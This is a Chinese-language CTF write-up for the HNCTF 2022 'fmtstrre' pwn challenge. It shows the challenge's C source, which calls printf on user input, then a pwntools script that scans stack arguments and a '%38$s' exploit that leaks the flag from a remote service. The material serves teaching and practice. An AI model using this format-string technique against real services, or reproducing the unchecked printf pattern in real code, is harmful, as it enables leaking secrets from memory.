# [HNCTF 2022 Week1]fmtstrre

**格式化字符串漏洞利用读取特定地址内容**

原思路的wp地址：https://www.nssctf.cn/note/set/13425 里面有讲解**位置参数的用法**

> **平台**：NSSCTF  
> **方向**：Pwn  
> **知识点**：格式化字符串  
> **难度**：入门

## 一、信息获取

可以先checksec一下

![image01](/pwn/[HNCTF%202022%20Week1]fmtstrre/image/image01.png)

NX、SHSTK 和 IBT 都开着，但它们限制的是在栈上执行代码、篡改返回地址和间接跳转。这题只是用格式化字符串读取栈上已有的 flag 指针，不劫持控制流，所以这三项不影响。

## 二、分析

```c
#include<stdio.h>
char name[0x30];
int key;
int main()
{
     setbuf(stdin,0);
     setbuf(stderr,0);
     setbuf(stdout,0);
     puts("Welcome to the world of fmtstr");
     puts("> ");
     int fd=open("flag",0);
     if(fd==-1){
        perror("Open failed.");
     }
     read(fd,name,0x30);
     size_t *pointer=&name;
     char buf[0x100];
     puts("Input your format string.");
     read(0,buf,0x100);
     puts("Ok.");
     printf(buf);
}
```

先分析源代码
程序把 **flag** 读进全局变量 `name`，又把 `name` 的地址存进栈上的 `pointer`。`printf(buf)` 存在格式化字符串漏洞。用`%n$s`会把这一格当成字符串指针，顺着它读出 `name` 里的 **flag**。

我们需要找到pointer是第几个参数（在哪里）

```python
#先在本地执行确定位置
from pwn import*
elf = context.binary = ELF('./ezfmt')
r = process('./ezfmt') 
#扫栈
payload = b''
for i in range(1,50):payload += f'{i} %p\n'.encode()
#%p 把那个参数当成指针的数值打印出来
r.sendlineafter(b'Input your format string.', payload)
r.interactive()
```

输出结果和ida中`name`的地址（0x4040c0）对应一下可得：
pointer为第38个参数
所以位置指示符应`38$`

## 三、EXP

```python
from pwn import *

context.log_level = "debug"

io = remote (...)

io.recvuntil(b"Input your format string.")
io.sendline(b"%38$s")
io.interactive()
```

可得flag

## 四、总结

这题的突破口是栈上的 `pointer`。程序把 flag 读进全局变量 `name`，又把 `name` 的地址存进 `pointer`，随后直接 `printf(buf)`。格式串可控，第 38 个参数正好是这个指针。
